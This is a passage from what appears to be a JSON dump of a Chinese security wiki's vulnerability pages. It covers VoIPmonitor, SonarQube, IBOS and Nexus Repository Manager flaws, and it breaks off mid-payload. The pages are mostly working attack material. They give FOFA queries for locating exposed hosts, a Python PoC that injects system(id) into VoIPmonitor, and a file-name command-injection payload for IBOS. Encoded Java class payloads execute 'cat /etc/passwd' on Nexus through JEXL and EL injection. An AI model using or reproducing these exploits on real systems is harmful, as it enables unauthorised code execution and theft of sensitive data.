"},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VoIPmonitor/":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VoIPmonitor/","title":"VoIPmonitor","keywords":"","body":"VoIPmonitor VoIPmonitor è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-30461 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-07 15:23:19 "},"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VoIPmonitor/VoIPmonitor è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-30461.html":{"url":"PeiQi_Wiki/æœåŠ¡å™¨åº”ç”¨æ¼æ´/VoIPmonitor/VoIPmonitor è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-30461.html","title":"VoIPmonitor è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-30461","keywords":"","body":"VoIPmonitor è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2021-30461 æ¼æ´æè¿° VoIPmonitoræ˜¯â€œå…·æœ‰åœ¨Linuxä¸Šè¿è¡Œçš„SIP RTPå’ŒRTCP VoIPåè®®çš„å…·æœ‰å•†ä¸šå‰ç«¯çš„å¼€æºç½‘ç»œæ•°æ®åŒ…å—…æ¢å™¨â€ã€‚ ä½¿ç”¨é€šè¿‡Webç•Œé¢åˆ°è¾¾çš„ç”¨æˆ·æä¾›çš„æ•°æ®ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹ç”¨æˆ·è§¦å‘VoIPmonitorä¸­çš„è¿œç¨‹PHPä»£ç æ‰§è¡Œæ¼æ´ã€‚ æ¼æ´å½±å“ [!NOTE] VoIPmonitor FOFA [!NOTE] \"VoIPmonitor\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ index.phpæ–‡ä»¶ä¸­çš„å…³é”®ä»£ç  $setConfigurationTypeValue_rslt = array(); if(file_exists('config/configuration.php')) { $existsConfiguration = true; if(isset($_POST['recheck'])) { if(!empty($_POST['SPOOLDIR'])) { setConfigurationTypeValue__index('SPOOLDIR', $_POST['SPOOLDIR']); } } ä¼ å…¥å‚æ•° recheck å’Œ SPOOLDIRï¼Œ å¹¶å°†SPOOLDIR å†™å…¥ config/configuration.php ä¸­ å‘é€å¦‚ä¸‹è¯·æ±‚åŒ… POST /index.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 29 SPOOLDIR=%2Ftmp&recheck=annen POST /index.php HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0 Accept-Encoding: gzip, deflate Accept: */* Connection: close Accept-Language: en-US,en;q=0.5 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Content-Length: 49 SPOOLDIR=test%22.system%28id%29.%22&recheck=annen æˆåŠŸæ‰§è¡Œå‘½ä»¤ æ¼æ´POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import base64 import requests import random import re import json import sys from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é”æ·EGç½‘å…³ cli.php RCE \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 poc.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/index.php\" data = {\"SPOOLDIR\": \"/tmp\", \"recheck\": \"annen\"} headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) POC_2(target_url) def POC_2(target_url): vuln_url = target_url + \"/index.php\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = {\"SPOOLDIR\": \"test\\\".system(id).\\\"\", \"recheck\": \"annen\"} print(\"\\033[36m[o] æ­£åœ¨æ‰§è¡Œå‘½ä»¤ id .....\\033[0m\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False) if \"uid=\" in response.text: print(\"\\033[36m[o] æˆåŠŸæ‰§è¡Œ id, ç›®æ ‡å­˜åœ¨æ¼æ´.....\\033[0m\") else: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") exit() except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) POC_1(target_url) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:44 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/","title":"Webåº”ç”¨æ¼æ´","keywords":"","body":"Webåº”ç”¨æ¼æ´ğŸ¦Œ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:42 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/SonarQube/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/SonarQube/","title":"SonarQube","keywords":"","body":"SonarQube SonarQube api ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-27986 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-13 00:24:40 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/SonarQube/SonarQube api ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-27986.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/SonarQube/SonarQube api ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-27986.html","title":"SonarQube api ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-27986","keywords":"","body":"SonarQube api ä¿¡æ¯æ³„éœ²æ¼æ´ CVE-2020-27986 æ¼æ´æè¿° SonarQube æŸæ¥å£å­˜åœ¨ä¿¡æ¯æ³„éœ²æ¼æ´ï¼Œå¯ä»¥è·å–éƒ¨åˆ†æ•æ„Ÿä¿¡æ¯ æ¼æ´å½±å“ [!NOTE] SonarQube FOFA [!NOTE] app=\"sonarQube-ä»£ç ç®¡ç†\" æ¼æ´å¤ç° ä¸»é¡µå¦‚ä¸‹ æ¼æ´POC http://xxx.xxx.xxx.xxx/api/settings/values å¯æ³„éœ²çš„ä¸ºï¼šæ˜æ–‡SMTPã€SVNå’ŒGitlabç­‰æ•æ„Ÿä¿¡æ¯ Goby & POC [!NOTE] SonarQube api Information leakage PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-27 22:19:47 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IBOS/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IBOS/","title":"IBOS","keywords":"","body":"IBOS IBOS æ•°æ®åº“æ¨¡å— ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-04-13 20:06:19 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IBOS/IBOS æ•°æ®åº“æ¨¡å— ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/IBOS/IBOS æ•°æ®åº“æ¨¡å— ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´.html","title":"IBOS æ•°æ®åº“æ¨¡å— ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´","keywords":"","body":"IBOS æ•°æ®åº“æ¨¡å— ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ æ¼æ´æè¿° IBOS åå°æ•°æ®åº“æ¨¡å— å­˜åœ¨ä»»æ„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œæ”»å‡»è€…è¿›å…¥åå°åå¯ä»¥ä¸Šä¼ æ¶æ„æ–‡ä»¶æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] IBOS FOFA [!NOTE] body=\"IBOS\" && body=\"login-panel\" æ¼æ´å¤ç° ç™»å½•é¡µé¢å¦‚ä¸‹ http://xxx.xxx.xxx.xxx/?r=dashboard/default/login æ‰¾åˆ°æ•°æ®åº“å¤‡ä»½æ¨¡å— æäº¤å¹¶æŠ“åŒ… ä¿®æ”¹filenameå‚æ•°å‘é€åŒ…ä¼šä¸Šä¼ test.phpæ–‡ä»¶åˆ°æ ¹ç›®å½• backuptype=all&custom_enabled=1&method=shell&sizelimit=2048&extendins=0&sqlcompat=MYSQL41&sqlcharset=utf8&usehex=0&usezip=0&filename=peiqi%26echo \"\">test%PATHEXT:~0,1%php%26test&dbSubmit=1 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 18:14:00 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/","title":"Nexus","keywords":"","body":"Nexus Nexus Repository Manger extdirect è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2019-7238 Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10199 Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10204 Nexus Repository Manger change-password ä½æƒé™ä¿®æ”¹ç®¡ç†å‘˜å¯†ç æ¼æ´ CVE-2020-11444 PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-28 21:28:21 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/Nexus Repository Manger extdirect è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2019-7238.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/Nexus Repository Manger extdirect è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2019-7238.html","title":"Nexus Repository Manger extdirect è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2019-7238","keywords":"","body":"Nexus Repository Manger extdirect è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2019-7238 æ¼æ´æè¿° è¿‘æ—¥ï¼Œç ”ç©¶äººå‘˜å‘ç°äº†é€šç”¨è½¯ä»¶åŒ…ä»“åº“ç®¡ç†æœåŠ¡ Nexus Repository Manager 3 å­˜åœ¨è®¿é—®æ§åˆ¶ç¼ºå¤±åŠè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ï¼Œæ¼æ´ç¼–å·ä¸º CVE-2019-7238 æ¼æ´å½±å“ [!NOTE] Nexus ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2019-7238 FOFA [!NOTE] app=\"Nexus-Repository-Manager\" æ¼æ´å¤ç° åå°é¡µé¢å¦‚ä¸‹ï¼Œä»»æ„ä¸Šä¼  jaråŒ… å‘é€è¯·æ±‚åŒ…æ‰§è¡Œå‘½ä»¤ POST /service/extdirect HTTP/1.1 Host: User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:63.0) Gecko/20100101 Firefox/63.0 Accept: */* Content-Type: application/json X-Requested-With: XMLHttpRequest Content-Length: 7256 Connection: close {\"action\": \"coreui_Component\", \"type\": \"rpc\", \"tid\": 8, \"data\": [{\"sort\": [{\"direction\": \"ASC\", \"property\": \"name\"}], \"start\": 0, \"filter\": [{\"property\": \"repositoryName\", \"value\": \"*\"}, {\"property\": \"expression\", \"value\": \"function(x, y, z, c, integer, defineClass){ c=1.class.forName('java.lang.Character'); integer=1.class; x='cafebabe0000003100ae0a001f00560a005700580a005700590a005a005b0a005a005c0a005d005e0a005d005f0700600a000800610a006200630700640800650a001d00660800410a001d00670a006800690a0068006a08006b08004508006c08006d0a006e006f0a006e00700a001f00710a001d00720800730a000800740800750700760a001d00770700780a0079007a08007b08007c07007d0a0023007e0a0023007f0700800100063c696e69743e010003282956010004436f646501000f4c696e654e756d6265725461626c650100124c6f63616c5661726961626c655461626c65010004746869730100114c4578706c6f69742f546573743233343b01000474657374010015284c6a6176612f6c616e672f537472696e673b29560100036f626a0100124c6a6176612f6c616e672f4f626a6563743b0100016901000149010003636d640100124c6a6176612f6c616e672f537472696e673b01000770726f636573730100134c6a6176612f6c616e672f50726f636573733b01000269730100154c6a6176612f696f2f496e70757453747265616d3b010006726573756c740100025b42010009726573756c745374720100067468726561640100124c6a6176612f6c616e672f5468726561643b0100056669656c640100194c6a6176612f6c616e672f7265666c6563742f4669656c643b01000c7468726561644c6f63616c7301000e7468726561644c6f63616c4d61700100114c6a6176612f6c616e672f436c6173733b01000a7461626c654669656c640100057461626c65010005656e74727901000a76616c75654669656c6401000e68747470436f6e6e656374696f6e01000e48747470436f6e6e656374696f6e0100076368616e6e656c01000b487474704368616e6e656c010008726573706f6e7365010008526573706f6e73650100067772697465720100154c6a6176612f696f2f5072696e745772697465723b0100164c6f63616c5661726961626c65547970655461626c650100144c6a6176612f6c616e672f436c6173733c2a3e3b01000a457863657074696f6e7307008101000a536f7572636546696c6501000c546573743233342e6a6176610c002700280700820c008300840c008500860700870c008800890c008a008b07008c0c008d00890c008e008f0100106a6176612f6c616e672f537472696e670c002700900700910c009200930100116a6176612f6c616e672f496e74656765720100106a6176612e6c616e672e5468726561640c009400950c009600970700980c0099009a0c009b009c0100246a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617001002a6a6176612e6c616e672e5468726561644c6f63616c245468726561644c6f63616c4d617024456e74727901000576616c756507009d0c009e009f0c009b00a00c00a100a20c00a300a40100276f72672e65636c697073652e6a657474792e7365727665722e48747470436f6e6e656374696f6e0c00a500a601000e676574487474704368616e6e656c01000f6a6176612f6c616e672f436c6173730c00a700a80100106a6176612f6c616e672f4f626a6563740700a90c00aa00ab01000b676574526573706f6e73650100096765745772697465720100136a6176612f696f2f5072696e745772697465720c00ac002f0c00ad002801000f4578706c6f69742f546573743233340100136a6176612f6c616e672f457863657074696f6e0100116a6176612f6c616e672f52756e74696d6501000a67657452756e74696d6501001528294c6a6176612f6c616e672f52756e74696d653b01000465786563010027284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b0100116a6176612f6c616e672f50726f6365737301000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b0100136a6176612f696f2f496e70757453747265616d010009617661696c61626c6501000472656164010007285b4249492949010005285b4229560100106a6176612f6c616e672f54687265616401000d63757272656e7454687265616401001428294c6a6176612f6c616e672f5468726561643b010007666f724e616d65010025284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f436c6173733b0100106765744465636c617265644669656c6401002d284c6a6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f7265666c6563742f4669656c643b0100176a6176612f6c616e672f7265666c6563742f4669656c6401000d73657441636365737369626c65010004285a2956010003676574010026284c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100176a6176612f6c616e672f7265666c6563742f41727261790100096765744c656e677468010015284c6a6176612f6c616e672f4f626a6563743b2949010027284c6a6176612f6c616e672f4f626a6563743b49294c6a6176612f6c616e672f4f626a6563743b010008676574436c61737301001328294c6a6176612f6c616e672f436c6173733b0100076765744e616d6501001428294c6a6176612f6c616e672f537472696e673b010006657175616c73010015284c6a6176612f6c616e672f4f626a6563743b295a0100096765744d6574686f64010040284c6a6176612f6c616e672f537472696e673b5b4c6a6176612f6c616e672f436c6173733b294c6a6176612f6c616e672f7265666c6563742f4d6574686f643b0100186a6176612f6c616e672f7265666c6563742f4d6574686f64010006696e766f6b65010039284c6a6176612f6c616e672f4f626a6563743b5b4c6a6176612f6c616e672f4f626a6563743b294c6a6176612f6c616e672f4f626a6563743b0100057772697465010005636c6f736500210026001f000000000002000100270028000100290000002f00010001000000052ab70001b100000002002a00000006000100000009002b0000000c000100000005002c002d00000009002e002f0002002900000304000400140000013eb800022ab600034c2bb60004572bb600054d2cb60006bc084e2c2d032cb60006b6000757bb0008592db700093a04b8000a3a05120b57120cb8000d120eb6000f3a06190604b6001019061905b600113a07120b571212b8000d3a0819081213b6000f3a09190904b6001019091907b600113a0a120b571214b8000d3a0b190b1215b6000f3a0c190c04b60010013a0d03360e150e190ab80016a2003e190a150eb800173a0f190fc70006a70027190c190fb600113a0d190dc70006a70016190db60018b60019121ab6001b990006a70009840e01a7ffbe190db600183a0e190e121c03bd001db6001e190d03bd001fb600203a0f190fb600183a101910122103bd001db6001e190f03bd001fb600203a111911b600183a121912122203bd001db6001e191103bd001fb60020c000233a1319131904b600241913b60025b100000003002a0000009600250000001600080017000d0018001200190019001a0024001b002e001d0033001f004200200048002100510023005b002500640026006a002700730029007d002a0086002b008c002d008f002f009c003100a5003200aa003300ad003500b6003600bb003700be003900ce003a00d1002f00d7003d00de003e00f4003f00fb004001110041011800420131004401380045013d0049002b000000de001600a5002c00300031000f0092004500320033000e0000013e003400350000000801360036003700010012012c00380039000200190125003a003b0003002e0110003c003500040033010b003d003e0005004200fc003f00400006005100ed004100310007005b00e3004200430008006400da004400400009007300cb00450031000a007d00c100460043000b008600b800470040000c008f00af00480031000d00de006000490043000e00f4004a004a0031000f00fb0043004b004300100111002d004c0031001101180026004d004300120131000d004e004f00130050000000340005005b00e3004200510008007d00c100460051000b00de006000490051000e00fb0043004b0051001001180026004d005100120052000000040001005300010054000000020055'; y=0; z=''; while (y lt x.length()){ z += c.toChars(integer.parseInt(x.substring(y, y+2), 16))[0]; y += 2; };defineClass=2.class.forName('java.lang.Thread');x=defineClass.getDeclaredMethod('currentThread').invoke(null);y=defineClass.getDeclaredMethod('getContextClassLoader').invoke(x);defineClass=2.class.forName('java.lang.ClassLoader').getDeclaredMethod('defineClass','1'.class,1.class.forName('[B'),1.class.forName('[I').getComponentType(),1.class.forName('[I').getComponentType()); \\ndefineClass.setAccessible(true);\\nx=defineClass.invoke(\\n y,\\n 'Exploit.Test234',\\n z.getBytes('latin1'), 0,\\n 3054\\n);x.getMethod('test', ''.class).invoke(null, 'cat /etc/passwd');'done!'}\\n\"}, {\"property\": \"type\", \"value\": \"jexl\"}], \"limit\": 50, \"page\": 1}], \"method\": \"previewAssets\"} PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-28 18:27:36 "},"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10199.html":{"url":"PeiQi_Wiki/Webåº”ç”¨æ¼æ´/Nexus/Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10199.html","title":"Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10199","keywords":"","body":"Nexus Repository Manger group åå°è¿œç¨‹å‘½ä»¤æ‰§è¡Œ CVE-2020-10199 æ¼æ´æè¿° Nexus åå°å­˜åœ¨ä¸€å¤„ä»»æ„ELè¡¨è¾¾å¼æ³¨å…¥æ¼æ´ï¼Œåªéœ€è¦ä»»æ„ä¸€ä¸ªç”¨æˆ·æƒé™å³å¯ æ¼æ´å½±å“ [!NOTE] Nexus ç¯å¢ƒæ­å»º https://github.com/vulhub/vulhub/tree/master/nexus/CVE-2020-10199 FOFA [!NOTE] app=\"Nexus-Repository-Manager\" æ¼æ´å¤ç° æ¼æ´è§¦å‘éœ€è¦ä»»æ„è´¦æˆ·æƒé™ ç™»å½•ä»»æ„ç”¨æˆ·åä¿®æ”¹ NXSESSIONIDï¼Œå‘é€è¯·æ±‚åŒ… POST /service/rest/beta/repositories/go/group HTTP/1.1 Host: Connection: keep-alive NX-ANTI-CSRF-TOKEN: 0.6153568974227819 Content-Length: 4789 X-Requested-With: XMLHttpRequest X-Nexus-UI: true Content-Type: application/json 404: \"id\" Cookie: jenkins-timestamper-offset=-28800000; Hm_lvt_8346bb07e7843cd10a2ee33017b3d627=1583249520; NX-ANTI-CSRF-TOKEN=0.6153568974227819; NXSESSIONID=66e8bf5f-0544-4d7d-b1d7-970ce5158aff { \"name\": \"internal\", \"online\": true, \"storage\": { \"blobStoreName\": \"default\", \"strictContentTypeValidation\": true }, \"group\": { \"memberNames\": [\"${' '.getClass().forName('com.sun.org.apache.bcel.internal.util.ClassLoader').newInstance().loadClass('$$BCEL$$$l$8b$I$A$A$A$A$A$A$A$8dV$eb$7f$UW$Z$7eN$b2$d9$99L$s$9bd6$9bd$A$xH$80M$80$5dJ$81$96$e5bC$K$e5$S$u$924$YR$ad$93eH$W6$3b$db$d9$d9$Q$d0j$d1Z$ea$adVQ$yj$d1R5$de5$a2$h$q$82h$V$b5$9f$fc$ea7$3f$f6$_$e0$83$3f$7f$8d$cf$99$dd$N$d9d$5b$fc$R$ce$ceyo$e7y$df$f3$3e$ef$cc$db$ef$de$bc$N$60$L$fe$a1$n$IGAVC$N$9cz$$$cfI$89$ab$m$a7$e2i$Nm$f04$e41$n$97$b3$w$s$a5$e4$9c$8a$f3$K$86U$7cR$c5$a74t$e0y$v$fd$b4$8a$cfhX$81$XT$5cP$f0Y$v$fa$9c$82$X5$7c$k$_$a9$b8$a8$e2e$F_P$f1E$V_R$f1e$F_Q$f1$8a$8a$afjx$V_$93$cb$d7$V$5cR$f0$N$N$df$c4e$Nk$f1$z$Nk$f0$9a$82$x$g$ba$e1$c8$cd$b7$e5$d3wT$7cW$fe$be$aea$r$ae$ca$e5$7b$K$be$af$e0$N$81$a07$e6$da$d6I$B$a3$ef$b45a$c5$d3Vf4$3e$e0$cbvP$bb3$95Iy$bb$Fj$a3$5d$83$C$81$5e$e7$a4$z$d0$d4$97$ca$d8G$f2$e3$p$b6$3b$60$8d$a4m$e9$ec$q$ad$f4$a0$e5$a6$e4$be$q$Mxc$a9$9c$40C$9f$3d$91J$c7$e5$c2$88$ea$ced$ba$U3$b4$df$f3$b2$bdN$sc$t$bd$94$93$RhY$A$a17m$e5r$b4o$Y$93Fc$W$ad$d2$95$m$9f$g9MGi$b2$7f$a1$89$e2$da$cf$e5$ed$9cG$f0cL$c2v$x$bd$fa$3d7$95$Z$95$40$5c$3b$97u29$C$N$9euS$9e4$8c$U$NSN$fc$u$ad$bc$e3$be$98$b6$b5$c9qV$u$3c$5c$zNM$969$86$Xh$8e$baN$d2$f6$b1$d7$8c0f$c7$7c$cc$3d$f9S$a7l$d7$3ey$cc$87$r$f5$b9$91y$fd$82$a0E$3b$ea$D$ac$94$84G$a4$f94$T$K$8d$z$wX$d0$f1k$m$a0$Xo$d1$bf$F$c21$X$c4t$edSi$da$c4$f7$a5$ec$b4$bc$d2$d0$C$d3$c3V$96$d8$x$F$y$fc$f9$f3$C$9a$t$_$d1wbM$8b$e7$e4$W$d5$60$fe$G4$3b$e3$b9$e7$fc$xcw$f8$9bA$x$9d$_$bb$b7Uv$c7$b9l$b9CZ$X_$f8$ce$ee$dd$M$d7$d8$efY$c93$c4$e2$9b$91U$K$ae$91$V$q$I$d9$40$S$u8$a8$e0M$bf$f5$af$94$fbX$ebw$f2n$92$t$ca$b8$f5$b2$d9b2$b6$8emx$b4$q$f0$5bP$t$7f$b7$ea$f8$B$7e$u$d0$bc$b8$e3u$fc$IS$3cL$c7$8f$f1$T$j$3f$c5$cf$E$3a$a5QL$g$c5$G$ee$X$aas$a0$a2h$3a$7e$8e_$I$d4y$c5$bc$ba$ff$l$9f$ce$bd$b2Nt$9a$90$a5$d2$f1K$fcJ$c7$af1$z$b0$ceqGc6y$92$cd$d9$b1$d3$b6$e7$9d$8b$e5lw$c2vc$95$8c$d1$f1$h$5c$e7$8d$8e$da$5e$F$F$9a$WUU$c7o$f1$bb$8at$8b7$a7$a0$a0c$G7X$3d$868V$e6M$bd$8cW$a2N$f3$e2$e6$q$Z$b6l$daB$d2$f9$ke$GI$97$e3$r$S$85$abp$88$W$f1$91T$s$3eb$e5$c6$d8$f7$h$93$K$7e$af$e3$sfu$fc$B$b7$d8$n$d59$c2N$$$x$Od$b2y$8f$Qlk$bc$a8c$H$e8$b8$8d$3f$ca$h$be$p$97$3f$95$c3$y$a1$92$8e$3fcZ$c7$5b$f8$8b$80$d0t$fcU$ee$ee$e2o$3a$fe$$$9bc$e5$7d$af$D$e9$b4$3dj$a5$7b$92$92$c1$7b$t$93v$b6H$b4$f0$7d$93$F$d2$f6$f7$60$Z$t$d9$92q$c0$aeN$e6$5d$97$dc$Y$u$N$dc$d6hW$b5$91$db$ccR$3e$c1$cb$b7X$85R$b4$8d$d1$a5$83$a7$eb$7d$u$de$98$b3$bdb$K$a9$e2$m$8e$9e$90$d3$bb$96$91$F$d6F$972$b8$ab$g$a9$95S$8e$7b$c4$g$a7$ff$9a$H$9c_$9e$d5$w$P$u$N$81p$b4$9a$81B$83b$c8$ca$e4$e7$87i$90$3d$e8O$b0H5$94$t$8a$8dv$d8$f6$c6$i$96$e5$f1$w$b0$86$97$9cZ$adP$c5$I$3c$af$e3$bdt$84$92$caL8g$Iu$7b$V$uU$a6$60$d5$g$$$e8$83c$f9$8c$97$92$a9$fb$5c$xo$o$Vu$u$89$e5$e8$b7$t$ed$a4$404Z$e5$9d$d3U$f5e$p$a7$c0$C$92$b0$3b$cb$a1$x$d9$p$b3$8eVU$c8$k$J$dfW$95$5eSR$aa$fas$ab$f82$b2$b2Y$3b$c3$falx$40S$yz$97$a9$9eS$k$mu$fe$ebv$d1$j$97$p$f0$b4$bad$da$c9$d9X$c5$ef$aa$m$bf$b7X19$b3$f9T$c3g$8es$ae$8fq$X$e7$af$e0o$5d$f7$M$c4$b4$af$de$ce5$e8$LU$q$b8$eaE$D$ec$c0N_$b6$ab$ec$i$e8$a4$dd2$c6$7es$W5C3$a8$bd$8e$c0$N$d4$j2$82$86R$80$da$b7$3eP$40$fd$fa$ee$C$b4$c3F$c3$N$e8G6$g$8d$94$t$Cf$40j$cc$c0$G$aa$ee$m$c4$bfD$9d$d1D$8bD$d0$M$g$cd$d2F1$V$df$a6$$$a1$9a$ea$edm$f5$b5$db$b4$88$W$a9$bf$s$b6$9ajD$db$9ch0$h$ee$8a$d5$a6b60FB7$f5$bb$a2$d9$d4$Lh$v$c00$c2$F$b4$5e$e1$d8$93$fbD$a3$d9hDjo$a1$ad$80vS$e7CG$Bf$od$86$a4$b2$c9l2$96$95$95$a1$b2$b2$d9$q$86$Wcy$80$8a$a1ZcE$bf$d46s$d7$c1$dd$H$b83$ef$60E$a2$85$be$P$z$f15LC$fa$7e$b0$ac0J$8a$3bX$99$I$Hoa$FC$ac$ea$l$K$Y$l$ea$l$aa3$5b$fa$T$ad7$b0$dal$z$a03$R$99$c5$9a$a1Y$ac$j2$p$F$ac$9bAt$G$5d$89$b6Yt$b3$b6$eb$T$ed$s$e3m$YJt$dcE$d8l7$Zs$a3$R$e3r$7cj$ee$j$b3$bd$80x$c24$c3$a6Y$c0$s$93$f9$3f$3c$85$ba$84$fe$a2$s$a6$de$7d$7b$K$81C$d3$bc$d8IqI$5c$c6fh$e2$aax$D$8f$m$e0_$f5U$ac$e3Z$cf$fehD$IM$fcxn$c6r$84$d99m$d4t$b0CL$f6$cdr$f4$e2$n$i$e4Go$3f5CX$8d$i$3a1$c9$af$e5$L$b4z$JQ$5cF$X$5e$c7z$5c$c7$G$be$93b$f8$t6$e1$k$k$W$3a6$8b$u$k$R$bb$b0E$3c$89$ad$e2$Zl$T6$k$TYl$X$_$60$87$b8$88$5d$e2$V$ec$W$97$d0Kt$3d$e25$ac$WW$b1$9f$I$f7$89k$3cQ$b6$e0$3bhg$ec$7b$d8$8d$P$T$e5u$fc$h$8f$a3$87ho$e2_$d8CY$TO$7b$8b$I$7b$88$fd$k$z$9f$c0$5e$b4$f0$e4$8b$d8G$99$c1$f3$cf$e0I$ecG$98$u$Gq$80Q$5b$89$a5$P$87$f8$3fBD$8f$e